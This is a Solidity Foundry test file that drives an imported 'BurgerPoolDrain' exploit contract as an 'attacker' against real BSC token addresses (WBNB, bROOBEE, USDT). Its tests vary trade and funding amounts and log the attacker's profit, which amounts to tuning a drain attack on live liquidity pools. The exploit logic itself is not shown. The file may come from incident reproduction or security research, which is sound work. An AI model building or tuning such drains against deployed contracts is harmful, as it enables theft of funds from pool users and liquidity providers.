// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerPoolDrain.sol";

contract BurgerPoolTest2 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant bROOBEE = 0xE64F5Cb844946C1F102Bd25bBD87a5aB4aE89Fbe;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;

    function _testPool(
        address token, uint256 buyWbnb, uint256 seedWbnb, uint256 pairPct, uint256 fundBnb
    ) internal returns (int256) {
        address att = makeAddr("attacker");
        vm.deal(att, fundBnb);
        vm.startPrank(att);

        uint256 bef = att.balance;
        BurgerPoolDrain e = new BurgerPoolDrain();

        try e.attack{value: fundBnb - 1 ether}(token, buyWbnb, seedWbnb, pairPct) {
            vm.stopPrank();
            return int256(att.balance) - int256(bef);
        } catch (bytes memory reason) {
            vm.stopPrank();
            return type(int256).min;
        }
    }

    // bROOBEE: smaller buy amounts
    function test_roobee_small() public {
        int256 d = _testPool(bROOBEE, 200 ether, 0, 50, 400 ether);
        emit log_named_int("bROOBEE 200", d);
    }

    function test_roobee_smaller() public {
        int256 d = _testPool(bROOBEE, 100 ether, 0, 50, 200 ether);
        emit log_named_int("bROOBEE 100", d);
    }

    function test_roobee_tiny() public {
        int256 d = _testPool(bROOBEE, 50 ether, 0, 50, 100 ether);
        emit log_named_int("bROOBEE 50", d);
    }

    // USDT: smaller buy amounts
    function test_usdt_10() public {
        int256 d = _testPool(USDT, 10 ether, 0, 50, 30 ether);
        emit log_named_int("USDT 10", d);
    }

    function test_usdt_15() public {
        int256 d = _testPool(USDT, 15 ether, 0, 50, 30 ether);
        emit log_named_int("USDT 15", d);
    }

    function test_usdt_20() public {
        int256 d = _testPool(USDT, 20 ether, 0, 50, 40 ether);
        emit log_named_int("USDT 20", d);
    }
}
